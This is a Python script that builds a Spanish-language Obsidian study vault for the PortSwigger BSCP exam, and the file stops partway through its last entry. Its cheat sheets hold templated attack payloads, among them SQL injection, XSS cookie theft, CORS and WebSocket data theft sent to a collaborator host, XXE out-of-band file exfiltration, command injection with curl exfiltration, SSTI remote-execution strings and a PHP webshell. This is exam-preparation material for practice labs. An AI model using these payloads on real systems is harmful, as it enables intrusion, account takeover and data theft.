# -*- coding: utf-8 -*-
"""Generador del vault Obsidian para BSCP. Idempotente: sobrescribe el vault."""
import os, shutil

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "..", "..")
# Se sobreescribe abajo con la ruta real pasada por argv o por defecto.
import sys
VAULT = sys.argv[1] if len(sys.argv) > 1 else r"C:\Users\ivana\Documents\proyect 1\vault-bscp"

def w(relpath, content):
    path = os.path.join(VAULT, relpath)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if not content.endswith("\n"):
        content += "\n"
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def fm(d):
    """Serializa un dict simple a frontmatter YAML."""
    lines = ["---"]
    for k, v in d.items():
        if isinstance(v, list):
            inner = ", ".join(str(x) for x in v)
            lines.append(f"{k}: [{inner}]")
        else:
            lines.append(f"{k}: {v}")
    lines.append("---")
    return "\n".join(lines)

# ---------------------------------------------------------------------------
# TEMARIO: (display, vuln_note_base, slug, cs_abbrev, academy, niveles)
# ---------------------------------------------------------------------------
TOPICS = [
    ("SQL Injection",        "SQL-Injection",        "sqli",               "SQLi",                "sql-injection",                    ["apprentice","practitioner"]),
    ("Cross-Site Scripting", "Cross-Site-Scripting", "xss",                "XSS",                 "cross-site-scripting",             ["apprentice","practitioner"]),
    ("CSRF",                 "CSRF",                 "csrf",               "CSRF",                "csrf",                             ["apprentice","practitioner"]),
    ("Clickjacking",         "Clickjacking",         "clickjacking",       "Clickjacking",        "clickjacking",                     ["apprentice","practitioner"]),
    ("DOM-based",            "DOM-Based",            "dom",                "DOM",                 "dom-based",                        ["apprentice","practitioner"]),
    ("CORS",                 "CORS",                 "cors",               "CORS",                "cors",                             ["apprentice","practitioner"]),
    ("XXE",                  "XXE",                  "xxe",                "XXE",                 "xxe",                              ["apprentice","practitioner"]),
    ("SSRF",                 "SSRF",                 "ssrf",               "SSRF",                "ssrf",                             ["apprentice","practitioner"]),
    ("Request Smuggling",    "Request-Smuggling",    "smuggling",          "Smuggling",           "request-smuggling",                ["practitioner"]),
    ("Command Injection",    "Command-Injection",    "cmdi",               "CMDi",                "os-command-injection",             ["apprentice","practitioner"]),
    ("SSTI",                 "SSTI",                 "ssti",               "SSTI",                "server-side-template-injection",   ["apprentice","practitioner"]),
    ("Path Traversal",       "Path-Traversal",       "path-traversal",     "Path-Traversal",      "file-path-traversal",              ["apprentice","practitioner"]),
    ("Access Control",       "Access-Control",       "access-control",     "Access-Control",      "access-control",                   ["apprentice","practitioner"]),
    ("Authentication",       "Authentication",       "auth",               "Auth",                "authentication",                   ["apprentice","practitioner"]),
    ("JWT",                  "JWT",                  "jwt",                "JWT",                 "jwt",                              ["apprentice","practitioner"]),
    ("OAuth",                "OAuth",                "oauth",              "OAuth",               "oauth",                            ["apprentice","practitioner"]),
    ("WebSockets",           "WebSockets",           "websockets",         "WebSockets",          "websockets",                       ["apprentice","practitioner"]),
    ("Cache Poisoning",      "Cache-Poisoning",      "cache-poisoning",    "Cache-Poisoning",     "web-cache-poisoning",              ["practitioner"]),
    ("Deserializacion",      "Deserializacion",      "deserializacion",    "Deserializacion",     "deserialization",                  ["apprentice","practitioner"]),
    ("Information Disclosure","Information-Disclosure","info-disclosure",   "Info-Disclosure",     "information-disclosure",           ["apprentice","practitioner"]),
    ("Business Logic",       "Business-Logic",       "business-logic",     "Business-Logic",      "logic-flaws",                      ["apprentice","practitioner"]),
    ("Host Header",          "Host-Header",          "host-header",        "Host-Header",         "host-header",                      ["apprentice","practitioner"]),
    ("File Upload",          "File-Upload",          "file-upload",        "File-Upload",         "file-upload",                      ["apprentice","practitioner"]),
    ("Prototype Pollution",  "Prototype-Pollution",  "prototype-pollution","Prototype-Pollution", "prototype-pollution",              ["apprentice","practitioner"]),
    ("NoSQL Injection",      "NoSQL-Injection",      "nosqli",             "NoSQLi",              "nosql-injection",                  ["apprentice","practitioner"]),
    ("GraphQL",              "GraphQL",              "graphql",            "GraphQL",             "graphql",                          ["apprentice","practitioner"]),
    ("Race Conditions",      "Race-Conditions",      "race-conditions",    "Race-Conditions",     "race-conditions",                  ["practitioner"]),
    ("API Testing",          "API-Testing",          "api",                "API",                 "api-testing",                      ["apprentice","practitioner"]),
]

def academy_url(slug_url):
    return f"https://portswigger.net/web-security/{slug_url}"

# ---------------------------------------------------------------------------
# CHEAT SHEETS: cada una con las 6 secciones OBLIGATORIAS de 1.7.
# Payloads verbatim del prompt, reorganizados bajo Deteccion / Plantillas.
# ---------------------------------------------------------------------------
CS = {}

CS["SQLi"] = dict(
flujo="""1. Inyecta una comilla en {{PARAM}} y observa error/cambio.
2. Determina el contexto (string vs numérico) y el motor.
3. Elige técnica: in-band (UNION) > error-based > blind boolean > blind time.
4. Enumera esquema y extrae credenciales de {{TARGET_USER}}.
5. Escala: login como admin → objetivo del examen.""",
deteccion="""```sql
-- Detección
'                      -- rompe la query
' OR '1'='1            -- respuesta distinta => inyectable
```""",
plantillas="""```sql
-- Bypass de login (plantilla)
{{TARGET_USER}}'--
' OR 1=1--
```
```sql
-- Nº de columnas y columna de texto
' ORDER BY {{N}}--
' UNION SELECT NULL,...,NULL--          -- {{N}} NULLs
' UNION SELECT 'a',NULL--               -- localizar columna string
```
```sql
-- Versión del motor (según cuál responda)
' UNION SELECT @@version,NULL--                    -- MySQL/MSSQL
' UNION SELECT version(),NULL--                    -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--        -- Oracle (usa FROM dual)
```
```sql
-- Enumeración y extracción
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{{TABLE}}'--
' UNION SELECT username,password FROM {{TABLE}}--
```
```sql
-- Blind booleana / substring
' AND SUBSTRING((SELECT password FROM {{TABLE}} WHERE username='{{TARGET_USER}}'),{{N}},1)='a
```
```sql
-- Blind por tiempo (elige motor)
'; IF (1=1) WAITFOR DELAY '0:0:5'--                 -- MSSQL
' OR IF(1=1,SLEEP(5),0)--                           -- MySQL
'; SELECT pg_sleep(5)--                             -- PostgreSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))--               -- PostgreSQL
```
```sql
-- OOB / exfil (Oracle) ⚠️
' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://{{COLLAB}}/">%x;]>'),'/l') FROM dual--
```""",
escalada="""Volcar credenciales de {{TARGET_USER}} → login → panel admin → leer {{SECRET_PATH}} / borrar usuario.""",
checklist="""- [ ] Probé comilla simple y doble en {{PARAM}}
- [ ] Identifiqué el motor
- [ ] Determiné nº de columnas y columna de texto
- [ ] Enumeré tablas/columnas o usé blind
- [ ] Escalé a acceso admin""",
referencias="""- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet""",
)

CS["XSS"] = dict(
flujo="""1. Inyecta un marcador único en {{PARAM}} y localiza dónde se refleja.
2. Identifica el contexto (HTML, atributo, string JS, URL).
3. Rompe el contexto con el payload mínimo que ejecute.
4. Escala: entrega vía {{EXPLOIT}} para que {{VICTIM}} ejecute → exfiltra a {{COLLAB}}.""",
deteccion="""```html
<!-- Detección por contexto -->
<svg onload=alert(1)>            <!-- HTML -->
"><svg onload=alert(1)>          <!-- atributo -->
'-alert(1)-'                     <!-- string JS -->
javascript:alert(1)              <!-- href/URL -->
```""",
plantillas="""```html
<!-- Bypass de filtros -->
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<img/src/onerror=alert(1)>       <!-- sin espacios -->
<script>onerror=alert;throw 1</script>  <!-- sin paréntesis -->
```
```html
<!-- Exfiltrar cookie de {{VICTIM}} -->
<script>fetch('https://{{COLLAB}}/?c='+encodeURIComponent(document.cookie))</script>
```
```html
<!-- Account takeover: leer CSRF y realizar acción -->
<script>
var r=new XMLHttpRequest();
r.onload=function(){
  var t=/name="csrf" value="([^"]+)"/.exec(this.responseText)[1];
  var c=new XMLHttpRequest();
  c.open('POST','{{BASE}}/my-account/change-email',true);
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send('email=attacker@evil.com&csrf='+t);
};
r.open('GET','{{BASE}}/my-account',true); r.send();
</script>
```""",
escalada="""XSS ejecutado por {{VICTIM}} (admin) → robo de sesión o acción autenticada → acceso admin.""",
checklist="""- [ ] Localicé el contexto de reflexión
- [ ] Ejecuté con el payload mínimo
- [ ] Revisé CSP y codificación
- [ ] Entregué vía {{EXPLOIT}} y confirmé callback en {{COLLAB}}""",
referencias="""- https://portswigger.net/web-security/cross-site-scripting""",
)

CS["CSRF"] = dict(
flujo="""1. Localiza una acción que cambia estado en {{BASE}}.
2. Comprueba defensa: token presente, ligado a sesión, SameSite.
3. Construye PoC que auto-envía desde {{EXPLOIT}}.""",
deteccion="""```html
<!-- ¿La acción de cambio de estado en {{BASE}} valida token/SameSite? -->
<!-- Repite la petición sin el token o cambiando POST->GET para confirmar debilidad -->
```""",
plantillas="""```html
<form action="{{BASE}}/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```""",
escalada="""Fuerza a {{VICTIM}} a cambiar su email/contraseña → toma de cuenta.
Bypasses: quitar token · POST→GET · token no ligado a sesión · token en cookie · SameSite Lax con GET.""",
checklist="""- [ ] Confirmé ausencia/debilidad del token
- [ ] PoC auto-envía y cambia estado
- [ ] Probé al menos un bypass si había token""",
referencias="""- https://portswigger.net/web-security/csrf""",
)

CS["SSRF"] = dict(
flujo="""1. Localiza un parámetro que acepte URL/host ({{PARAM}}).
2. Apunta a localhost/red interna o metadata.
3. Si hay filtro, ofusca. Si es ciego, confirma con {{COLLAB}}.""",
deteccion="""```
http://127.0.0.1/{{ADMIN_PATH}}
http://169.254.169.254/latest/meta-data/     ⚠️ cloud
http://{{COLLAB}}/                            (blind, confirmación OAST)
```""",
plantillas="""```
# Bypass de filtros
http://127.1/     http://[::1]/     http://2130706433/
http://localhost#@evil.com     http://evil.com@127.0.0.1/     http://127.0.0.1.nip.io/
```""",
escalada="""SSRF a la interfaz admin interna → acción privilegiada (borrar usuario) / leer metadata.""",
checklist="""- [ ] Probé localhost y notaciones alternativas
- [ ] Probé redirect a interno
- [ ] Confirmé SSRF ciego vía {{COLLAB}}""",
referencias="""- https://portswigger.net/web-security/ssrf""",
)

CS["XXE"] = dict(
flujo="""1. Detecta entrada XML (body, SOAP, subida SVG/DOCX).
2. Prueba entidad externa para leer fichero.
3. Si es ciego, usa DTD externa en {{EXPLOIT}} y exfiltra a {{COLLAB}}.""",
deteccion="""```xml
<!-- Sonda: define una entidad y observa si se resuelve en la respuesta -->
<!DOCTYPE foo [<!ENTITY test "INYECTABLE">]>
<x>&test;</x>
```""",
plantillas="""```xml
<!-- Lectura de fichero -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<x>&xxe;</x>
```
```xml
<!-- Blind OOB (dispara la DTD) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{EXPLOIT}}/x.dtd"> %xxe;]>
```
```xml
<!-- DTD alojada en {{EXPLOIT}} para exfiltrar -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ex SYSTEM 'http://{{COLLAB}}/?x=%file;'>">
%eval; %ex;
```
```xml
<!-- XInclude si no controlas el DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```""",
escalada="""Leer credenciales/ficheros → o SSRF vía XXE a interno.""",
checklist="""- [ ] Probé entidad SYSTEM file://
- [ ] Probé OOB con DTD en {{EXPLOIT}}
- [ ] Probé vía subida (SVG/DOCX)""",
referencias="""- https://portswigger.net/web-security/xxe""",
)

CS["CMDi"] = dict(
flujo="""1. Identifica {{PARAM}} que alimente un comando del sistema.
2. Inyecta un separador + {{CMD}}.
3. Si no ves salida, usa retardo o OAST/exfil a {{COLLAB}}.""",
deteccion="""```
& {{CMD}} &      ; {{CMD}} ;      | {{CMD}}      $( {{CMD}} )      ` {{CMD}} `
```""",
plantillas="""```
# Ciego
& ping -c 10 127.0.0.1 &              (retardo)
& nslookup {{COLLAB}} &               (OAST)
& curl http://{{COLLAB}}/?x=$({{CMD}}) &
& {{CMD}} > /var/www/images/out.txt & (redirigir salida a la web)
```""",
escalada="""RCE → leer {{SECRET_PATH}} o exfiltrar.""",
checklist="""- [ ] Probé varios separadores
- [ ] Confirmé ejecución (retardo u OAST)
- [ ] Recuperé la salida (directa, fichero o OOB)""",
referencias="""- https://portswigger.net/web-security/os-command-injection""",
)

CS["SSTI"] = dict(
flujo="""1. Inyecta expresiones matemáticas para detectar evaluación.
2. Identifica el motor por la sintaxis que evalúe.
3. Escala de expresión → lectura de fichero → RCE.""",
deteccion="""```
{{7*7}}   ${7*7}   ${{7*7}}   #{7*7}   <%= 7*7 %>     -- detección
```""",
plantillas="""```
{{cycler.__init__.__globals__.os.popen('{{CMD}}').read()}}          -- Jinja2/Python
{{['{{CMD}}']|filter('system')}}                                     -- Twig/PHP
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{{CMD}}")}  -- Freemarker/Java
<%= system('{{CMD}}') %>                                             -- ERB/Ruby
```""",
escalada="""Identifica motor → RCE → leer {{SECRET_PATH}}.""",
checklist="""- [ ] Confirmé evaluación con 7*7
- [ ] Identifiqué el motor
- [ ] Ejecuté {{CMD}} / leí fichero""",
referencias="""- https://portswigger.net/web-security/server-side-template-injection""",
)

CS["Path-Traversal"] = dict(
flujo="""1. Localiza {{PARAM}} que cargue un fichero.
2. Sube directorios; si hay filtro, codifica/anida.""",
deteccion="""```
../../../etc/passwd               (sonda base: ¿aparece el contenido del fichero?)
```""",
plantillas="""```
../../../etc/passwd
....//....//etc/passwd            (anidado)
%2e%2e%2f%2e%2e%2fetc/passwd      (URL-encoded)
%252e%252e%252f...                (doble encoding)
/etc/passwd                       (ruta absoluta)
../../../etc/passwd%00.png        (null byte, legacy)
```""",
escalada="""Leer ficheros sensibles del sistema o {{SECRET_PATH}} → credenciales para escalar a admin.""",
checklist="""- [ ] Probé traversal directo, codificado y anidado
- [ ] Probé ruta absoluta""",
referencias="""- https://portswigger.net/web-security/file-path-traversal""",
)

CS["Access-Control"] = dict(
flujo="""1. Mapea roles y rutas privilegiadas.
2. Prueba acceso directo, IDOR y manipulación de rol.""",
deteccion="""```
/admin                       (forced browsing: ¿accesible sin privilegios?)
GET /api/users/{{N}}         (¿devuelve datos ajenos?)
```""",
plantillas="""```
/admin                       (forced browsing)
id={{N}} -> id={{N+1}}       (IDOR)
role/isAdmin en cookie/body  (manipular)
X-Original-URL: /admin       (bypass front-end)
método POST->GET, caso /Admin
```""",
escalada="""IDOR para leer datos ajenos · escalada de rol → admin → borrar usuario / leer {{SECRET_PATH}}.""",
checklist="""- [ ] Probé rutas admin directas
- [ ] Probé IDOR en identificadores
- [ ] Probé manipular rol y headers de bypass""",
referencias="""- https://portswigger.net/web-security/access-control""",
)

CS["Auth"] = dict(
flujo="""1. Enumera usuarios (mensajes/timing).
2. Fuerza bruta con Intruder.
3. Ataca 2FA, reset y persistencia de sesión.""",
deteccion="""```
Enumeración: diferencias de respuesta o de tiempo al probar {{PARAM}}=usuario
```""",
plantillas="""```
Enumeración: diferencias de respuesta o de tiempo
Fuerza bruta: Burp Intruder (cluster bomb / pitchfork)
2FA: saltar al endpoint post-2FA · fuerza bruta del código · manipular respuesta success:true
Reset: token predecible/reutilizable · fuga de token · poisoning con Host header del enlace
Cookie remember-me predecible · sesión válida tras cambio de contraseña
```""",
escalada="""Comprometer la cuenta de {{TARGET_USER}} → acceso admin → objetivo del examen.""",
checklist="""- [ ] Enumeré usuarios
- [ ] Probé fuerza bruta controlada
- [ ] Probé bypass de 2FA y flujo de reset""",
referencias="""- https://portswigger.net/web-security/authentication""",
)

CS["JWT"] = dict(
flujo="""1. Identifica el token (3 bloques base64url).
2. Prueba alg:none, secreto débil y confusión de algoritmo.
3. Forja el token de {{TARGET_USER}}.""",
deteccion="""```
Decodifica header y payload (base64url). Observa alg, kid, jwk/jku y el claim de rol.
```""",
plantillas="""```
alg:none        -> header {"alg":"none"}, firma vacía (deja el punto final)
HMAC débil      -> crackear (hashcat -m 16500 / jwt-tool)
kid injection   -> path traversal o SQLi en kid
jwk/jku         -> firmar con tu clave y alojar JWK en {{EXPLOIT}}
RS256 -> HS256  -> usar la clave pública como secreto HMAC
```""",
escalada="""Forjar token con rol admin (usuario {{TARGET_USER}}) → panel admin.""",
checklist="""- [ ] Probé alg:none
- [ ] Probé secreto débil
- [ ] Probé confusión de algoritmo""",
referencias="""- https://portswigger.net/web-security/jwt""",
)

CS["OAuth"] = dict(
flujo="""1. Traza el flujo (authorization code / implicit).
2. Ataca redirect_uri, state y fuga de code.""",
deteccion="""```
Observa el parámetro redirect_uri y si existe state en la petición de {{BASE}}.
```""",
plantillas="""```
redirect_uri manipulable -> robar code/token hacia {{EXPLOIT}}
falta de state (CSRF)    -> vincular cuenta de {{VICTIM}} a la tuya
fuga de code vía Referer
email no verificado / account linking inseguro
```""",
escalada="""Robar el code/token de {{VICTIM}} o vincular su cuenta → acceso a su sesión → admin.""",
checklist="""- [ ] Probé redirect_uri alterado
- [ ] Probé ausencia de state
- [ ] Revisé fugas del code""",
referencias="""- https://portswigger.net/web-security/oauth""",
)

CS["CORS"] = dict(
flujo="""1. Refleja tu Origin y observa ACAO/ACAC.
2. Si confía con credenciales, exfiltra datos desde {{EXPLOIT}}.""",
deteccion="""```
Envía Origin: https://{{COLLAB}} y observa si se refleja en Access-Control-Allow-Origin
con Access-Control-Allow-Credentials: true.
```""",
plantillas="""```html
<script>
var r=new XMLHttpRequest();
r.onload=function(){location='//{{COLLAB}}/?d='+encodeURIComponent(this.responseText)};
r.open('GET','{{BASE}}/accountDetails',true);
r.withCredentials=true; r.send();
</script>
```
```
Bypasses: Origin: null (iframe sandbox) · subdominio con XSS · validación por prefijo/sufijo
```""",
escalada="""Exfiltrar datos autenticados de {{VICTIM}} (API keys/credenciales) → login/admin.""",
checklist="""- [ ] Confirmé ACAO refleja Origin + ACAC true
- [ ] Exfiltré datos sensibles a {{COLLAB}}""",
referencias="""- https://portswigger.net/web-security/cors""",
)

CS["Smuggling"] = dict(
flujo="""1. Detecta desincronización por timing (extensión HTTP Request Smuggler).
2. Clasifica CL.TE / TE.CL / TE.TE / CL.0.
3. Explota: capturar petición ajena o saltar controles front-end.""",
deteccion="""```
# Sonda de timing: petición con TE ambiguo que retrasa la respuesta => desync
# Usa la extensión "HTTP Request Smuggler" sobre {{BASE}}
```""",
plantillas="""```
# CL.TE (esquema)
Content-Length: 6
Transfer-Encoding: chunked
0
X
```
```
# TE.TE (ofuscación del header)
Transfer-Encoding: chunked
Transfer-Encoding: x
```""",
escalada="""Capturar la petición de {{VICTIM}} (robar cookie admin) o bypass de /admin.""",
checklist="""- [ ] Confirmé desincronización
- [ ] Clasifiqué la variante
- [ ] Capturé datos de otro usuario / salté control""",
referencias="""- https://portswigger.net/web-security/request-smuggling""",
)

CS["Cache-Poisoning"] = dict(
flujo="""1. Busca entradas no incluidas en la clave (headers).
2. Consigue que se reflejen con payload.
3. Fuerza el guardado en caché (usa cache buster al probar).""",
deteccion="""```
Añade un header no incluido en la clave y observa si se refleja en la respuesta de {{BASE}}.
Usa un cache buster (?cb={{N}}) para no envenenar entradas reales mientras pruebas.
```""",
plantillas="""```
X-Forwarded-Host: {{EXPLOIT}}      (si acaba en <script src>)
X-Host / X-Forwarded-Scheme
```""",
escalada="""Servir XSS/redirect cacheado a todas las víctimas (incluido {{VICTIM}}).""",
checklist="""- [ ] Identifiqué input no incluido en la clave
- [ ] Reflejé y caché el payload
- [ ] Verifiqué con cache buster""",
referencias="""- https://portswigger.net/web-security/web-cache-poisoning""",
)

CS["Deserializacion"] = dict(
flujo="""1. Identifica datos serializados (PHP/Java/…).
2. Manipula el objeto para escalar.
3. Si hace falta RCE, usa gadget chain.""",
deteccion="""```
Localiza cookies/params serializados: PHP (O:...), Java (base64 rO0AB / bytes ac ed 00 05).
```""",
plantillas="""```
PHP: O:4:"User":2:{s:8:"username";s:6:"{{TARGET_USER}}";s:7:"isAdmin";b:1;}
     (abusa __wakeup/__destruct; considera PHAR)
Java: base64 rO0AB / bytes ac ed 00 05
     java -jar ysoserial.jar CommonsCollections4 '{{CMD}}' | base64   ⚠️
```""",
escalada="""Escalar privilegio o RCE → leer {{SECRET_PATH}}.""",
checklist="""- [ ] Identifiqué el formato serializado
- [ ] Manipulé campos para escalar
- [ ] Probé gadget chain si tocaba RCE""",
referencias="""- https://portswigger.net/web-security/deserialization""",
)

CS["Business-Logic"] = dict(
flujo="""1. Lista las suposiciones del desarrollador en cada flujo.
2. Rompe una por una (cliente controla lo que no debería).""",
deteccion="""```
Revisa cada campo enviado ({{PARAM}}): precio, cantidad, rol, pasos. ¿El servidor confía en el cliente?
```""",
plantillas="""```
Cantidades/precios negativos o desbordamiento
Saltar pasos del flujo (ir directo a confirmar)
Reaplicar cupones/descuentos
Confianza excesiva en datos del cliente (rol, precio)
Parámetros ocultos / mass assignment
```""",
escalada="""Abusar de la lógica para comprar gratis, elevar rol o acceder a funciones de {{TARGET_USER}}.""",
checklist="""- [ ] Probé valores fuera de rango
- [ ] Probé saltar/reordenar pasos
- [ ] Probé manipular campos de confianza""",
referencias="""- https://portswigger.net/web-security/logic-flaws""",
)

CS["Host-Header"] = dict(
flujo="""1. Manipula Host / X-Forwarded-Host y observa reflejo o routing.
2. Encadena con reset de contraseña o cache poisoning.""",
deteccion="""```
Cambia Host: {{EXPLOIT}} y observa si se refleja en enlaces/respuesta o cambia el routing.
```""",
plantillas="""```
Host: {{EXPLOIT}}                 (poisoning del enlace de reset)
X-Forwarded-Host: {{EXPLOIT}}
Host: localhost                   (funcionalidad interna)
```""",
escalada="""Envenenar el enlace de reset de {{VICTIM}} para robar su token → toma de cuenta.""",
checklist="""- [ ] Probé Host y X-Forwarded-Host
- [ ] Encadené con reset o caché""",
referencias="""- https://portswigger.net/web-security/host-header""",
)

CS["File-Upload"] = dict(
flujo="""1. Sube un fichero de código y localiza su ruta.
2. Si hay filtro, evádelo (extensión, tipo, magic bytes, traversal).""",
deteccion="""```
Sube un fichero de prueba y localiza la URL donde queda servido ({{BASE}}/files/...).
```""",
plantillas="""```php
<?php echo file_get_contents('{{SECRET_PATH}}'); ?>       // leer el secreto
<?php echo system($_GET['{{PARAM}}']); ?>                 // {{PARAM}} = {{CMD}} a ejecutar (webshell parametrizado)
```
```
Bypasses: shell.php.jpg · .phtml/.php5 · Content-Type spoof · GIF89a magic bytes
          ../shell.php (traversal) · .htaccess -> AddType php · race condition
```""",
escalada="""Ejecutar el shell → leer {{SECRET_PATH}}.""",
checklist="""- [ ] Subí y localicé el fichero
- [ ] Evadí el filtro
- [ ] Ejecuté y leí el secreto""",
referencias="""- https://portswigger.net/web-security/file-upload""",
)

CS["Prototype-Pollution"] = dict(
flujo="""1. Contamina el prototipo con una propiedad de prueba.
2. Busca un gadget que el código lea y encadena impacto.""",
deteccion="""```
Contamina una propiedad de prueba y comprueba en consola: Object.prototype.{{COL}}
```""",
plantillas="""```
# Cliente (DOM) — usa DOM Invader
?__proto__[{{COL}}]={{val}}
constructor.prototype.{{COL}}={{val}}
```
```json
// Servidor (JSON body)
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```""",
escalada="""Gadget de prototipo → XSS en cliente o elevación (isAdmin) en servidor → acceso admin.""",
checklist="""- [ ] Contaminé el prototipo
- [ ] Encontré un gadget explotable""",
referencias="""- https://portswigger.net/web-security/prototype-pollution""",
)

CS["NoSQLi"] = dict(
flujo="""1. Inyecta sintaxis Mongo en {{PARAM}}.
2. Prueba operadores para bypass o extracción ciega.""",
deteccion="""```
admin' || '1'=='1                   (¿cambia la respuesta? => inyectable)
```""",
plantillas="""```
admin' || '1'=='1
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":"^{{TARGET_USER}}"}}
'||sleep(5000)||'                   ($where, ciega)
```""",
escalada="""Bypass de login como {{TARGET_USER}} o extracción ciega de credenciales → admin.""",
checklist="""- [ ] Probé operadores $ne/$regex
- [ ] Probé bypass de login
- [ ] Probé inyección ciega""",
referencias="""- https://portswigger.net/web-security/nosql-injection""",
)

CS["GraphQL"] = dict(
flujo="""1. Localiza el endpoint (/graphql, /api).
2. Introspección para mapear el esquema.
3. Abusa aliasing/batching e IDOR.""",
deteccion="""```graphql
{__typename}                              # confirma endpoint GraphQL en {{BASE}}
```""",
plantillas="""```graphql
{__schema{types{name fields{name}}}}     # introspección
```
```
Aliasing/batching -> saltar rate-limit (fuerza bruta)
IDOR consultando IDs ajenos
Herramientas: InQL / visor GraphQL de Burp
```""",
escalada="""IDOR/aliasing para leer datos de {{TARGET_USER}} o forzar credenciales → acceso admin.""",
checklist="""- [ ] Encontré el endpoint
- [ ] Corrí introspección
- [ ] Probé aliasing/batching e IDOR""",
referencias="""- https://portswigger.net/web-security/graphql""",
)

CS["Race-Conditions"] = dict(
flujo="""1. Localiza una comprobación con ventana temporal (límite, saldo, cupón).
2. Envía peticiones en paralelo (single-packet attack).""",
deteccion="""```
Identifica en {{BASE}} un endpoint con comprobación previa a una acción (saldo, límite, cupón).
```""",
plantillas="""```
Burp Repeater -> "Send group in parallel" (single-packet attack)
Turbo Intruder para volumen
Casos: canjear cupón/tarjeta varias veces, saltar límites, 2FA
```""",
escalada="""Duplicar el efecto (saldo/cupón) o saltar límites → ventaja que lleva al objetivo.""",
checklist="""- [ ] Identifiqué la ventana de carrera
- [ ] Envié en paralelo
- [ ] Confirmé el efecto duplicado""",
referencias="""- https://portswigger.net/web-security/race-conditions""",
)

CS["API"] = dict(
flujo="""1. Descubre endpoints y métodos.
2. Prueba mass assignment y method/content-type tampering.""",
deteccion="""```
Enumera rutas ({{BASE}}/api/...) y prueba métodos alternativos (OPTIONS, PUT) y esquemas.
```""",
plantillas="""```
Mass assignment: añadir "isAdmin":true / "role":"admin" al body
Method tampering: GET->POST->PUT · cambiar Content-Type
Server-side parameter pollution en la query interna
```""",
escalada="""Mass assignment de rol (isAdmin) → acceso admin → borrar usuario / leer {{SECRET_PATH}}.""",
checklist="""- [ ] Enumeré endpoints y métodos
- [ ] Probé mass assignment
- [ ] Probé tampering de método/content-type""",
referencias="""- https://portswigger.net/web-security/api-testing""",
)

CS["Clickjacking"] = dict(
flujo="""1. Comprueba si la página se puede enmarcar (falta X-Frame-Options/frame-ancestors).
2. Superpone un iframe transparente con un señuelo.""",
deteccion="""```
Enmarca {{BASE}} en un iframe y comprueba si carga (sin X-Frame-Options / CSP frame-ancestors).
```""",
plantillas="""```html
<style>iframe{opacity:0.0001;position:absolute;inset:0;width:100%;height:100%}
#decoy{position:absolute;top:{{N}}px;left:{{N}}px}</style>
<div id="decoy">Click</div>
<iframe src="{{BASE}}/my-account"></iframe>
```""",
escalada="""Engañar a {{VICTIM}} para que ejecute una acción sensible (cambiar email / borrar cuenta).""",
checklist="""- [ ] Confirmé que se puede enmarcar
- [ ] Alineé el señuelo con la acción""",
referencias="""- https://portswigger.net/web-security/clickjacking""",
)

CS["DOM"] = dict(
flujo="""1. Traza fuentes controlables hasta sumideros peligrosos (usa DOM Invader).
2. Inyecta según el sumidero.""",
deteccion="""```
Fuentes: location(.hash/.search), document.URL, referrer, postMessage
Sumideros: innerHTML, document.write, eval, setTimeout, location, srcdoc
```""",
plantillas="""```
Ejemplo: #<img src=x onerror=alert(1)>   (hash -> innerHTML)
{{PARAM}} controlado -> sumidero (elige el payload según el sink)
```""",
escalada="""DOM XSS ejecutado por {{VICTIM}} → robo de sesión / acción autenticada; también open redirect.""",
checklist="""- [ ] Identifiqué fuente->sumidero
- [ ] Ejecuté según el sumidero
- [ ] Revisé DOM open redirect""",
referencias="""- https://portswigger.net/web-security/dom-based""",
)

# --- Cheat sheets AUTORADAS (no venían verbatim en el prompt) ---
CS["WebSockets"] = dict(
flujo="""1. Intercepta el handshake y los mensajes WebSocket con Burp.
2. Manipula mensajes: prueba XSS/SQLi/inyección sobre el contenido.
3. Si el handshake no valida Origin, monta Cross-Site WebSocket Hijacking (CSWSH) desde {{EXPLOIT}}.""",
deteccion="""```
Handshake: GET ... Upgrade: websocket   (ws:// o wss:// hacia {{BASE}})
¿Valida el header Origin? ¿La sesión va sólo por cookie? -> candidato a CSWSH.
```""",
plantillas="""```
# Manipulación de mensaje (inyección en el contenido)
{"message":"<img src=x onerror=alert(1)>"}     (XSS reflejado vía WS)
{"user":"{{PARAM}}' OR 1=1--"}                  (SQLi tunelizada por WS)
```
```html
<!-- CSWSH: robar datos de la sesión de {{VICTIM}} y exfiltrar a {{COLLAB}} -->
<script>
var ws=new WebSocket('wss://{{BASE}}/chat');
ws.onopen=function(){ws.send('READY');};
ws.onmessage=function(e){fetch('https://{{COLLAB}}/?d='+encodeURIComponent(e.data));};
</script>
```""",
escalada="""CSWSH sobre la sesión de {{VICTIM}} → leer su historial/credenciales → acceso admin.""",
checklist="""- [ ] Intercepté y manipulé mensajes WS
- [ ] Probé XSS/SQLi sobre el contenido
- [ ] Probé CSWSH si el handshake no valida Origin
- [ ] Confirmé exfiltración a {{COLLAB}}""",
referencias="""- https://portswigger.net/web-security/websockets
- https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking""",
)

CS["Info-Disclosure"] = dict(
flujo="""1. Provoca y lee mensajes de error, y revisa recursos expuestos.
2. Recolecta rutas, versiones, comentarios, backups y ficheros de control.
3. Usa lo filtrado como entrada para otra vulnerabilidad (rutas, credenciales, tokens).""",
deteccion="""```
